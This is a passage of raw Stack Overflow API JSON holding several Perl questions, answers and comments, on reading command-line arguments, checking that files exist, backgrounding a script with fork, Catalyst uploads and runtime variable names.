"question_id": 41921979, "link": "https://stackoverflow.com/questions/41921979/argv-in-perl-not-working/41922049#41922049", "title": "ARGV in perl not working", "body": "<p>Issues</p>\n\n<ol>\n<li>In your test case <code>$ARGV[1]</code> is not defined since Perl arrays are zero-indexed</li>\n<li>You need to <code>open</code> a filehandle to <code>$filename</code></li>\n<li>You need to do <code>readline</code> on the filehandle, e.g. <code>while ( &lt;$fh&gt; ) { ... }</code></li>\n</ol>\n\n<p>That said, just use the diamond operator <code>&lt;&gt;</code> or <code>&lt;ARGV&gt;</code>:</p>\n\n<pre><code>while (&lt;&gt;) {\n    ...\n}\n</code></pre>\n"}], "owner": {"reputation": 527, "user_id": 5571914, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/0585097f26069beb3b696cb0d7dba241?s=128&d=identicon&r=PG&f=1", "display_name": "Arun", "link": "https://stackoverflow.com/users/5571914/arun"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 718, "favorite_count": 0, "closed_date": 1485725460, "accepted_answer_id": 41922049, "answer_count": 2, "score": 0, "last_activity_date": 1485701683, "creation_date": 1485700158, "question_id": 41921979, "link": "https://stackoverflow.com/questions/41921979/argv-in-perl-not-working", "closed_reason": "Duplicate", "title": "ARGV in perl not working", "body": "<p>Below is the snippet that works, </p>\n\n<pre><code>open(C, \"Inputfile.txt\")  || die \"Cannot open the file\\n\";\nuse List::MoreUtils qw(uniq);\nuse Math::Round\nwhile(&lt;C&gt;)\n</code></pre>\n\n<p>I wish to pass the file name in command line. I tried to use ARGV but it is not working. I modified it to:</p>\n\n<pre><code>use List::MoreUtils qw(uniq);\nmy $filename = $ARGV[1];\nwhile($filename)\n</code></pre>\n\n<p>When I execute it with </p>\n\n<pre><code>perl file.pl inputfile.txt\n</code></pre>\n\n<p>I do not get any output. Can anyone say, why it is not working ?</p>\n\n<p>Thanks,</p>\n\n<p>AP</p>\n"}, {"tags": ["perl", "file", "using", "exists"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1485700915, "post_id": 41921869, "comment_id": 71024754, "body": "This question is far too broad as written. You&#39;ll have to be more specific on what exactly your problem is."}, {"owner": {"reputation": 11, "user_id": 7365982, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/95cf0d7e52a253759ff47a9935539184?s=128&d=identicon&r=PG&f=1", "display_name": "dhina n", "link": "https://stackoverflow.com/users/7365982/dhina-n"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1485701114, "post_id": 41921869, "comment_id": 71024807, "body": "Just check file exists or not with header and trailer check . generate as a mail with table format of filename and status as 1or 0. If not generated highlight those files using perl"}, {"owner": {"reputation": 11, "user_id": 7365982, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/95cf0d7e52a253759ff47a9935539184?s=128&d=identicon&r=PG&f=1", "display_name": "dhina n", "link": "https://stackoverflow.com/users/7365982/dhina-n"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1485701215, "post_id": 41921869, "comment_id": 71024839, "body": "@MattJacob  is it okay now?"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1485701284, "post_id": 41921869, "comment_id": 71024864, "body": "You&#39;ve only slightly restated your original question! Please <a href=\"https://stackoverflow.com/tour\">tour</a> <a href=\"https://stackoverflow.com\">Stack Overflow</a> and learn <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> good questions, and then <a href=\"https://stackoverflow.com/posts/41921869/edit\">edit</a> your question accordingly."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 7365982, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/95cf0d7e52a253759ff47a9935539184?s=128&d=identicon&r=PG&f=1", "display_name": "dhina n", "link": "https://stackoverflow.com/users/7365982/dhina-n"}, "edited": false, "score": 0, "creation_date": 1485704666, "post_id": 41922346, "comment_id": 71025878, "body": "What about remote server check if I have password less login using key.. How I can verify?"}, {"owner": {"reputation": 11, "user_id": 7365982, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/95cf0d7e52a253759ff47a9935539184?s=128&d=identicon&r=PG&f=1", "display_name": "dhina n", "link": "https://stackoverflow.com/users/7365982/dhina-n"}, "edited": false, "score": 0, "creation_date": 1485704892, "post_id": 41922346, "comment_id": 71025960, "body": "And also how to use perl module without installing .. Bcz I can&#39;t install in production server .  is there any way I can use.. Placing modules in my own directory and use it from there"}, {"owner": {"reputation": 75, "user_id": 7194922, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a2607dd0e70db7243e79ddc4d331a77d?s=128&d=identicon&r=PG&f=1", "display_name": "Antiro42", "link": "https://stackoverflow.com/users/7194922/antiro42"}, "reply_to_user": {"reputation": 11, "user_id": 7365982, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/95cf0d7e52a253759ff47a9935539184?s=128&d=identicon&r=PG&f=1", "display_name": "dhina n", "link": "https://stackoverflow.com/users/7365982/dhina-n"}, "edited": false, "score": 0, "creation_date": 1485707009, "post_id": 41922346, "comment_id": 71026661, "body": "If you don&#39;t need to do any operations requiring perl on the remote server I would suggest just executing a command via ssh and processing the output in perl, that way you don&#39;t need to install any perl code on the remote machine.  use <code>$output = `ssh remote_machine ls filename`</code> for example (note the backtick character ( ` ), its not a quote!)"}], "tags": [], "owner": {"reputation": 75, "user_id": 7194922, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a2607dd0e70db7243e79ddc4d331a77d?s=128&d=identicon&r=PG&f=1", "display_name": "Antiro42", "link": "https://stackoverflow.com/users/7194922/antiro42"}, "is_accepted": false, "score": 0, "last_activity_date": 1485702506, "creation_date": 1485702506, "answer_id": 41922346, "question_id": 41921869, "link": "https://stackoverflow.com/questions/41921869/perl-script-to-check-file-exists-in-linux-file-system/41922346#41922346", "title": "Perl script to check file exists in Linux file system", "body": "<p>You can check if a file exists using</p>\n\n<pre><code>if(-e \"filename\"){\n  #file exists\n}\nelse{\n  #file does not exist\n}\n</code></pre>\n\n<blockquote>\n  <p>And also it check for file header and trailer.</p>\n</blockquote>\n\n<p>Not sure what you mean with this, but I guess once you verified that the file exists you can just read its content to check it:</p>\n\n<pre><code>open FILE, \"filename\" or die \"Error opening file!\\n\"\nwhile(my $line=&lt;FILE&gt;){\n  #process line\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 7365982, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/95cf0d7e52a253759ff47a9935539184?s=128&d=identicon&r=PG&f=1", "display_name": "dhina n", "link": "https://stackoverflow.com/users/7365982/dhina-n"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 590, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1485702506, "creation_date": 1485699400, "last_edit_date": 1485701186, "question_id": 41921869, "link": "https://stackoverflow.com/questions/41921869/perl-script-to-check-file-exists-in-linux-file-system", "title": "Perl script to check file exists in Linux file system", "body": "<p>I am working on production servers.. I want to check file generated daily and send report via email like file generated or not daily.. I like to use perl script and I might run the script on different server so my script should check on other server where file generates. And also it check for file header and trailer. Please guide me how to check in different system and how to generate as mail content depends upon file exists or not conditions I.e if all file exists content something like all file generated and it contain table with filename and status of the file exists . if file not exists file name should be highlighted and content should be like missing file not generated please investigate... Give me some ideas around this.. Thanks</p>\n\n<p>Summaries:</p>\n\n<p>Just check file exists or not with header and trailer check . generate as a mail with table format of filename and status as 1or 0. If not generated highlight those files using perl</p>\n"}, {"tags": ["perl", "unix", "fork", "zombie-process"], "comments": [{"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 1, "creation_date": 1485644288, "post_id": 41915769, "comment_id": 71012937, "body": "Orphans, i.e. processes where the parent is no longer there, are usually automatically reaped by the init process. Zombies are a different thing: there the parent process exists but does not care to <code>wait</code> for the child and thus the process is not fully reaped even if it is dead. In your case this would be orphans, so no need to worry about this part. You might need to worry about shared file descriptors etc with the parent of the parent (i.e. shell)."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485645133, "post_id": 41915769, "comment_id": 71013163, "body": "As stated, this is safe.  It is one way to put something in the background -- fork and exit in the parent immediately, while the code to run is in the child.  Then the init takes over the child and all is well (will eventually reap it, when the child finishes). What do you want the child to do then? Is it somehow related to the initial processing that is done in the parent before it exits?"}, {"owner": {"reputation": 51553, "user_id": 557306, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OAmpG.jpg?s=128&g=1", "display_name": "sidyll", "link": "https://stackoverflow.com/users/557306/sidyll"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485646155, "post_id": 41915769, "comment_id": 71013409, "body": "Thanks @zdim . Yes, related. Well, I&#39;m calling it just a new mode to run the same thing. In its &quot;normal&quot; mode the script fetches data, outputs a summary of what will be done, and then outputs what is being done in each step. I already implemented a silent mode, but I find the summary to be particularly useful. So this new &quot;mode&quot; would run until the summary is printed, then if the new option was given do a fork, kill the parent, set to silent and continue execution. Hopefully this is a good way to implement it."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485647753, "post_id": 41915769, "comment_id": 71013786, "body": "OK, thanks. You can restart that same program in the child as a deamon, running it with the option to not do that initial summary part.  That may simplify the code altogether.  A good way to make it a deamon is by  <a href=\"http://search.cpan.org/~akreal/Proc-Daemon-0.23/lib/Proc/Daemon.pod\" rel=\"nofollow noreferrer\">Proc::Daemon</a>.  There is good info on a seemingly very similar idea in <a href=\"http://stackoverflow.com/questions/2646694/running-job-in-the-background-from-perl-without-waiting-for-return\">this post</a> and <a href=\"http://stackoverflow.com/questions/19186436/switch-perl-process-to-background-after-user-input\">this post</a>."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485647939, "post_id": 41915769, "comment_id": 71013828, "body": "Also, <a href=\"http://www.perlmonks.org/?node_id=41683\" rel=\"nofollow noreferrer\">this perlmonks post</a> rehashes <a href=\"http://perldoc.perl.org/perlipc.html#Complete-Dissociation-of-Child-from-Parent\" rel=\"nofollow noreferrer\">code from perlipc</a> to daemonize a process (no modules)."}, {"owner": {"reputation": 51553, "user_id": 557306, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OAmpG.jpg?s=128&g=1", "display_name": "sidyll", "link": "https://stackoverflow.com/users/557306/sidyll"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485648058, "post_id": 41915769, "comment_id": 71013850, "body": "@zdim thank you very much for the links and information!"}], "answers": [{"comments": [{"owner": {"reputation": 51553, "user_id": 557306, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OAmpG.jpg?s=128&g=1", "display_name": "sidyll", "link": "https://stackoverflow.com/users/557306/sidyll"}, "edited": false, "score": 0, "creation_date": 1485646838, "post_id": 41915824, "comment_id": 71013561, "body": "Considering that in normal execution my script wouldn&#39;t close stdin et all, I&#39;m wondering if this child would really need to do it after its creation. Am I&#39;m missing something?"}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "reply_to_user": {"reputation": 51553, "user_id": 557306, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OAmpG.jpg?s=128&g=1", "display_name": "sidyll", "link": "https://stackoverflow.com/users/557306/sidyll"}, "edited": false, "score": 0, "creation_date": 1485672288, "post_id": 41915824, "comment_id": 71017720, "body": "@sidyll: this is probably only relevant if you start a script from an interactive shell and don&#39;t want to have any trouble from bad interactions with the shell, i.e. like the shell stopping the script if it writes to stdout etc. There are a couple of other pitfalls in this area like inferring the shells job control. I&#39;ve often seen double fork combined with closing of the std* fd to fully detach from the shell."}], "tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": true, "score": 2, "last_activity_date": 1485644483, "creation_date": 1485644483, "answer_id": 41915824, "question_id": 41915769, "link": "https://stackoverflow.com/questions/41915769/how-to-continue-perl-script-execution-in-background/41915824#41915824", "title": "How to continue Perl script execution in background?", "body": "<p>Orphans, i.e. processes where the parent is no longer there, are usually automatically reaped by the init process. Zombies are a different thing: there the parent process exists but does not care to <code>wait</code> for the child and thus the process is not fully reaped even if it is dead. In your case this would be orphans, so no need to worry about this part. </p>\n\n<p>You might still need to worry about shared file descriptors etc with the parent of the parent in case you've executed your process from a shell. I recommend that you also close all file descriptors but especially stdin, stderr and stdout.</p>\n"}], "owner": {"reputation": 51553, "user_id": 557306, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OAmpG.jpg?s=128&g=1", "display_name": "sidyll", "link": "https://stackoverflow.com/users/557306/sidyll"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 289, "favorite_count": 2, "accepted_answer_id": 41915824, "answer_count": 1, "score": 1, "last_activity_date": 1485644483, "creation_date": 1485644020, "question_id": 41915769, "link": "https://stackoverflow.com/questions/41915769/how-to-continue-perl-script-execution-in-background", "title": "How to continue Perl script execution in background?", "body": "<p>I have a script in which I'd like to add an \"auto\" mode where it will do\nsome processing, generate  some output, and then enter  in background by\nitself.</p>\n\n<p>How can I achieve  this safely? Would a simple fork  and exit the parent\ndo it, or would this generate a zombie (orphan) problem?</p>\n\n<pre><code># initial processing\ndefined (my $pid fork) or die \"Can't fork: $!\";\nexit if $pid;\n# continue child in background\n</code></pre>\n"}, {"tags": ["perl", "blob", "catalyst", "dbix-class"], "answers": [{"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485680051, "post_id": 41916403, "comment_id": 71019303, "body": "I think this is correct, but you should quote the doc and provide an example, or this should really be a comment."}, {"owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1486061198, "post_id": 41916403, "comment_id": 71195460, "body": "I kind of missed the Slurp method. As @simbabque says, it is not a super detailed answer, but it did ring the bell so... thanks a lot :)"}, {"owner": {"reputation": 1853, "user_id": 1005136, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9fa4e79e60474302c8225172649cbd35?s=128&d=identicon&r=PG", "display_name": "Alexander Hartmaier", "link": "https://stackoverflow.com/users/1005136/alexander-hartmaier"}, "edited": false, "score": 0, "creation_date": 1486104894, "post_id": 41916403, "comment_id": 71211236, "body": "My answers are short and without much formatting when I&#39;m on my smartphone."}], "tags": [], "owner": {"reputation": 1853, "user_id": 1005136, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9fa4e79e60474302c8225172649cbd35?s=128&d=identicon&r=PG", "display_name": "Alexander Hartmaier", "link": "https://stackoverflow.com/users/1005136/alexander-hartmaier"}, "is_accepted": true, "score": 0, "last_activity_date": 1485649745, "creation_date": 1485649745, "answer_id": 41916403, "question_id": 41915723, "link": "https://stackoverflow.com/questions/41915723/uploading-blob-to-database-using-catalystrequestupload/41916403#41916403", "title": "Uploading BLOB to database using Catalyst::Request::Upload", "body": "<p>What about the 'slurp' method? It defaults to the :raw layer.</p>\n"}], "owner": {"reputation": 518, "user_id": 6146264, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-YPMqqSeGAMU/AAAAAAAAAAI/AAAAAAAAAoA/AIMsmwe_vc8/photo.jpg?sz=128", "display_name": "Leitouran", "link": "https://stackoverflow.com/users/6146264/leitouran"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "accepted_answer_id": 41916403, "answer_count": 1, "score": 1, "last_activity_date": 1485649745, "creation_date": 1485643764, "question_id": 41915723, "link": "https://stackoverflow.com/questions/41915723/uploading-blob-to-database-using-catalystrequestupload", "title": "Uploading BLOB to database using Catalyst::Request::Upload", "body": "<p>Among the methods with which the Catalyst upload object is blessed, none of them allows to retrieve the actual \"blob\" to store it directly as is in the database.</p>\n\n<p><a href=\"http://search.cpan.org/~jjnapiork/Catalyst-Runtime-5.90114/lib/Catalyst/Request/Upload.pm\" rel=\"nofollow noreferrer\">http://search.cpan.org/~jjnapiork/Catalyst-Runtime-5.90114/lib/Catalyst/Request/Upload.pm</a></p>\n\n<p>Is there any way to workaround this or should I just change the schema to store paths?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 83048, "user_id": 2255089, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZNAsT.jpg?s=128&g=1", "display_name": "Casimir et Hippolyte", "link": "https://stackoverflow.com/users/2255089/casimir-et-hippolyte"}, "edited": false, "score": 1, "creation_date": 1485635082, "post_id": 41914440, "comment_id": 71010232, "body": "Why do you want to do that?"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1485636685, "post_id": 41914440, "comment_id": 71010709, "body": "You can&#39;t do that. If you could, what would you use it for?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 4, "creation_date": 1485637800, "post_id": 41914440, "comment_id": 71011034, "body": "People ask <a href=\"https://www.google.com/search?q=perl+variable+variable+name+site:stackoverflow.com\" rel=\"nofollow noreferrer\">similar things</a> on SO all the time, and the answer is always the same: don&#39;t do it."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1485642994, "post_id": 41914440, "comment_id": 71012587, "body": "By definition, a variable can&#39;t be declared at runtime. You can create one (by simply accessing it), but you can&#39;t declare one, which is the entire reason you shouldn&#39;t do it."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1485657305, "post_id": 41914440, "comment_id": 71015453, "body": "You can do <code>convert_to_uppercase_new($text, my $CustomName)</code>. That&#39;s only 1 character longer than <code>convert_to_uppercase_new($text, &quot;CustomName&quot;)</code>."}, {"owner": {"reputation": 3599, "user_id": 3503851, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/3f4e91b450a25ee2170025f0b56332fa?s=128&d=identicon&r=PG&f=1", "display_name": "Omar", "link": "https://stackoverflow.com/users/3503851/omar"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1485657596, "post_id": 41914440, "comment_id": 71015498, "body": "@melpomene Great. Thanks a lot."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1485691964, "post_id": 41914440, "comment_id": 71022324, "body": "Obligatory: <a href=\"http://perl.plover.com/varvarname.html\" rel=\"nofollow noreferrer\">Why it&#39;s a bad idea to use a variable as a variable name</a>"}], "owner": {"reputation": 3599, "user_id": 3503851, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/3f4e91b450a25ee2170025f0b56332fa?s=128&d=identicon&r=PG&f=1", "display_name": "Omar", "link": "https://stackoverflow.com/users/3503851/omar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 51, "favorite_count": 0, "closed_date": 1485638548, "answer_count": 0, "score": 0, "last_activity_date": 1485656993, "creation_date": 1485634949, "last_edit_date": 1485656993, "question_id": 41914440, "link": "https://stackoverflow.com/questions/41914440/subroutine-declares-new-variable-using-passed-in-string-as-its-name", "closed_reason": "Duplicate", "title": "Subroutine declares new variable using passed in string as its name", "body": "<p><strong>What I'm looking for to do is to:</strong> Pass a name (just a string) to a subroutine and let the subroutine declare a new variable with that passed in name.</p>\n\n<p><strong>Explanatory Example 1 (Simplified):</strong></p>\n\n<pre><code>$name = \"MyVariable\";\ndeclareNewVariable($name); #This line should work exactly as \"my $MyVariable;\"\n\nsub declareNewVariable {\n    my $newVariableName = shift;\n    #\u2026: Here should be a line to declare the new variable named by the passed string,\n       #which I'm looking for.\n}\n</code></pre>\n\n<hr>\n\n<p><strong>Explanatory Example 2 (More Detailed):</strong></p>\n\n<pre><code>$text = 'hello';\nconvert_to_uppercase_new($text,\"CustomName\");\n    #Doesn't use declaration syntax each time I use the subroutine.\nprint $text; #Prints: hello\nprint $CustomName; #Prints: HELLO\n\nsub convert_to_uppercase_new {\n    #Should convert text to upper case then store the result in a new variable\n\n    my ($content, $newVariableName) = @_;\n        #The subroutine takes in the string to be converted to upper case\n        #and another string to be used as the new variable name.\n\n    \u2026$newVariableName\u2026 = uc $content; \n        #dots (placeholder) represent blank space that should be filled with some\n        #syntax that helps to declare the new variable with the name (string)\n        #stored in $newVariableName.\n}\n</code></pre>\n\n<p>The same thing could be achieved by simply making the subroutine return a value:</p>\n\n<pre><code>$text = 'hello';\nmy $CustomName = convert_to_uppercase($text);\n    #Uses declaration syntax each time I use the subroutine.    \nprint $text; #Prints: hello\nprint $CustomName; #Prints: HELLO\n\nsub convert_to_uppercase {\n    #Simply returns the result\n\n    my ($content) = @_;\n\n    return uc $content; \n}\n</code></pre>\n\n<hr>\n\n<p>The reason I want to use this is not to re-type declaration syntax each time I use the subroutine <code>my $newVariable = convert_to_uppercase(param);</code>. Instead, I want to only use the subroutine call without new variable declaration syntax <code>convert_to_uppercase_new(param1,param2);</code> I see it simpler and nattier.</p>\n"}, {"tags": ["linux", "perl", "terminal", "x11"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1485629905, "post_id": 41913559, "comment_id": 71008536, "body": "I suppose urxvt qualifies technically, but I don&#39;t see how that would speed up anything."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485630017, "post_id": 41913559, "comment_id": 71008585, "body": "You say very little about your application. I would guess that a web application may be a good fit, but you don&#39;t explain how the threads are initiated. Please add more information."}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1485631875, "post_id": 41913559, "comment_id": 71009157, "body": "@Borodin Main thread starts worker threads as required.  Each worker thread should get/use its own terminal (terminal tab) via STDIN/STDOUT/STDERR."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1485632100, "post_id": 41913559, "comment_id": 71009226, "body": "Perl threads are not known to be fast (in particular, spawning a new thread clones the perl interpreter, which makes a copy of all variables/data structures in your code)."}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1485634004, "post_id": 41913559, "comment_id": 71009901, "body": "@melpomene urxvt in daemon/client mode seems to fit except &quot;multiple tabs in one window&quot; requirement. Thanks for the hint.  I will wait a little for  a better solution/hint."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1485634712, "post_id": 41913559, "comment_id": 71010108, "body": "Not an x11 question, consider removing irrelevant tags."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": 